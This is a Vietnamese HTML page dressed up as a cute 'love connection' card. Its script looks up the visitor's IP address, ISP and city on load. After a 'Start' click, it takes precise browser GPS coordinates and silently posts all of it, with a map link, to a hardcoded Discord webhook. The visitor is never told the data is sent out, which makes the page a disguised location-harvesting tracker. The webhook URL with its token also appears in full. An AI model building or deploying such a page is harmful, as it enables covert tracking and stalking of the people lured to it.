<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Kết Nối Yêu Thương Cùng DoctorThanh:)</title>
<style>
  :root{
    --ink:#1c2b25;
    --paper:#eef0e6;
    --paper-dim:#e2e5d8;
    --pine:#2f4a3c;
    --pine-deep:#1c332a;
    --brass:#a9762f;
    --brass-bright:#c68a3a;
    --line:#c9cdb8;
    --mono: 'JetBrains Mono', 'Courier New', monospace;
    --serif: 'Georgia', 'Times New Roman', serif;
  }
  *{box-sizing:border-box;}
  html,body{margin:0;padding:0;}
  body{
    background:
      radial-gradient(circle at 20% 10%, rgba(47,74,60,0.05), transparent 40%),
      repeating-linear-gradient(0deg, transparent, transparent 27px, rgba(28,43,37,0.035) 28px),
      var(--paper);
    color:var(--ink);
    font-family:var(--mono);
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:32px 18px;
  }

  .sheet{
    width:100%;
    max-width:640px;
    border:1px solid var(--line);
    background:var(--paper);
    position:relative;
    box-shadow:0 1px 0 rgba(28,43,37,0.05), 0 30px 60px -30px rgba(28,43,37,0.25);
  }
  .sheet::before{
    content:"";
    position:absolute;
    inset:8px;
    border:1px solid rgba(28,43,37,0.15);
    pointer-events:none;
  }

  header{
    padding:34px 36px 22px;
    border-bottom:1px solid var(--line);
  }
  .eyebrow{
    font-size:11px;
    letter-spacing:.22em;
    text-transform:uppercase;
    color:var(--pine);
    display:flex;
    align-items:center;
    gap:10px;
  }
  .eyebrow::before{
    content:"";
    width:7px;height:7px;
    border-radius:50%;
    background:var(--brass-bright);
    box-shadow:0 0 0 3px rgba(198,138,58,0.18);
  }
  h1{
    font-family:var(--serif);
    font-weight:400;
    font-size:32px;
    margin:14px 0 6px;
    letter-spacing:.01em;
  }
  .sub{
    font-size:13px;
    color:#5a6b5f;
    line-height:1.6;
    max-width:46ch;
  }

  main{padding:28px 36px 34px;}

  .entry{
    display:grid;
    grid-template-columns:112px 1fr;
    gap:4px 18px;
    padding:14px 0;
    border-bottom:1px dashed var(--line);
    align-items:baseline;
  }
  .entry:last-of-type{border-bottom:none;}
  .label{
    font-size:11px;
    text-transform:uppercase;
    letter-spacing:.14em;
    color:var(--brass);
  }
  .value{
    font-size:15px;
    color:var(--ink);
    word-break:break-word;
    min-height:1.2em;
  }
  .value.pending{color:#8b9188;font-style:italic;}
  .value.muted{color:#8b9188;font-size:13px;}

  .actions{
    margin-top:26px;
    display:flex;
    gap:12px;
    flex-wrap:wrap;
  }
  button{
    font-family:var(--mono);
    font-size:13px;
    letter-spacing:.04em;
    padding:12px 20px;
    border:1px solid var(--pine);
    background:transparent;
    color:var(--pine-deep);
    cursor:pointer;
    transition:background .15s ease, color .15s ease, transform .1s ease;
  }
  button.primary{
    background:var(--pine-deep);
    color:var(--paper);
    border-color:var(--pine-deep);
  }
  button:hover{transform:translateY(-1px);}
  button.primary:hover{background:var(--pine);}
  button.ghost:hover{background:rgba(47,74,60,0.06);}
  button:disabled{opacity:.5;cursor:not-allowed;transform:none;}

  .note{
    margin-top:22px;
    padding:14px 16px;
    background:var(--paper-dim);
    border-left:2px solid var(--brass-bright);
    font-size:12px;
    color:#4d5b4f;
    line-height:1.65;
  }

  .map-link{
    display:inline-block;
    margin-top:4px;
    font-size:12px;
    color:var(--pine);
    text-decoration:underline;
    text-underline-offset:3px;
  }

  footer{
    padding:16px 36px 26px;
    font-size:10.5px;
    color:#9aa196;
    letter-spacing:.05em;
    display:flex;
    justify-content:space-between;
  }

  @media (max-width:480px){
    header,main,footer{padding-left:22px;padding-right:22px;}
    .entry{grid-template-columns:1fr;gap:2px;}
    h1{font-size:26px;}
  }
</style>
</head>
<body>

<div class="sheet">
  <header>
    <div class="eyebrow">Bảng Kết Nối Yêu Thương</div>
    <h1>IP &amp; Trái Tim Của Bạn</h1>
    <p class="sub">Biết Mình Đang Làm Gì Không:)</p>
  </header>

  <main>
    <div class="entry">
      <div class="label">ILoveYou</div>
      <div class="value pending" id="ipValue">Dò...</div>
    </div>
    <div class="entry">
      <div class="label">My Love</div>
      <div class="value pending" id="ispValue">Tọa Đồ Tình Yêu Bạn(IP)</div>
      <div class="value pending" id="ipLocValue">Dò...</div>
    </div>
    <div class="entry">
      <div class="label">Love Hay Love</div>
      <div class="value muted" id="gpsValue">HeHe</div>
    </div>
    <div class="entry">
      <div class="label">I Dont</div>
      <div class="value muted" id="accValue">—</div>
    </div>

    <div class="actions">
      <button class="primary" id="gpsBtn">Start</button>
      <button class="ghost" id="refreshBtn">Làm Mới</button>
    </div>

    <div class="note">
      OMG
    </div>
  </main>

  <footer>
    <span>Cảm Ơn Nhiều</span>
    <span id="clock">--:--:--</span>
  </footer>
</div>

<script>
  // Đồng hồ nhỏ ở góc, chỉ để trang có nhịp sống
  function tick(){
    const d = new Date();
    document.getElementById('clock').textContent = d.toLocaleTimeString('vi-VN', {hour12:false});
  }
  tick(); setInterval(tick, 1000);

  const ipEl = document.getElementById('ipValue');
  const ispEl = document.getElementById('ispValue');
  const ipLocEl = document.getElementById('ipLocValue');
  const gpsEl = document.getElementById('gpsValue');
  const accEl = document.getElementById('accValue');
  const gpsBtn = document.getElementById('gpsBtn');
  const refreshBtn = document.getElementById('refreshBtn');

  async function loadIpInfo(){
    ipEl.textContent = '…'; ipEl.classList.add('pending');
    ispEl.textContent = '…'; ispEl.classList.add('pending');
    ipLocEl.textContent = '…'; ipLocEl.classList.add('pending');
    try{
      // APi.co trả về JSON công khai, không cần API key cho mức dùng cơ bản
      const res = await fetch('https://ipapi.co/json/');
      if(!res.ok) throw new Error('request failed');
      const data = await res.json();

      ipEl.textContent = data.ip || 'không xác định';
      ipEl.classList.remove('pending');

      ispEl.textContent = data.org || 'không xác định';
      ispEl.classList.remove('pending');

      const parts = [data.city, data.region, data.country_name].filter(Boolean);
      ipLocEl.textContent = parts.length ? parts.join(', ') : 'không xác định';
      ipLocEl.classList.remove('pending');
    }catch(err){
      ipEl.textContent = 'Chuẩn Bị Dò'; ipEl.classList.remove('pending');
      ispEl.textContent = '—'; ispEl.classList.remove('pending');
      ipLocEl.textContent = '—'; ipLocEl.classList.remove('pending');
    }
  }

  function requestGps(){
    if(!('geolocation' in navigator)){
      gpsEl.textContent = 'trình duyệt không hỗ trợ Geolocation';
      return;
    }
    gpsBtn.disabled = true;
    gpsEl.textContent = 'Mình Xin Phép';
    gpsEl.classList.add('pending');

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const { latitude, longitude, accuracy } = pos.coords;
        gpsEl.classList.remove('pending', 'muted');
        gpsEl.textContent = latitude.toFixed(6) + ', ' + longitude.toFixed(6);
        accEl.classList.remove('muted');
        accEl.textContent = '± ' + Math.round(accuracy) + ' m';

        const link = document.createElement('a');
        link.className = 'map-link';
        link.href = `https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}#map=16/${latitude}/${longitude}`;
        link.target = '_blank';
        link.rel = 'noopener noreferrer';
        link.textContent = 'Xem trên bản đồ →';
        gpsEl.after(link);

        gpsBtn.disabled = false;
        gpsBtn.textContent = 'LOADING';

        sendToDiscord({
          ip: ipEl.textContent,
          ipLoc: ipLocEl.textContent,
          lat: latitude.toFixed(6),
          lng: longitude.toFixed(6),
          acc: Math.round(accuracy)
        });
      },
      (err) => {
        gpsEl.classList.remove('pending');
        gpsEl.classList.add('muted');
        gpsEl.textContent = err.code === 1
          ? 'bạn đã từ chối cấp quyền'
          : 'không lấy được vị trí (' + err.message + ')';
        gpsBtn.disabled = false;
      },
      { enableHighAccuracy: true, timeout: 12000 }
    );
  }

  // ─── Webhook Discord ───
  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1535896126891360277/bB2CVqiDLb1wm_OVrx5B6Kq7qGaui5sYs6vcEYa6styz7V5YecnbZ7iODBUglFl31ZMG";

  async function sendToDiscord(payload){
    if(!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("DÁN_WEBHOOK")) return;
    try{
      await fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content:
            `📍 **Có người vừa chia sẻ vị trí**\n` +
            `IP: ${payload.ip}\n` +
            `Vị trí theo IP: ${payload.ipLoc}\n` +
            `Toạ độ GPS: ${payload.lat}, ${payload.lng} (±${payload.acc}m)\n` +
            `Bản đồ: https://www.openstreetmap.org/?mlat=${payload.lat}&mlon=${payload.lng}#map=16/${payload.lat}/${payload.lng}\n` +
            `Thời gian: ${new Date().toLocaleString('vi-VN')}`
        })
      });
    }catch(err){
      console.error('Gửi Discord thất bại:', err);
    }
  }

  gpsBtn.addEventListener('click', requestGps);
  refreshBtn.addEventListener('click', loadIpInfo);
  loadIpInfo();
</script>

</body>
</html>
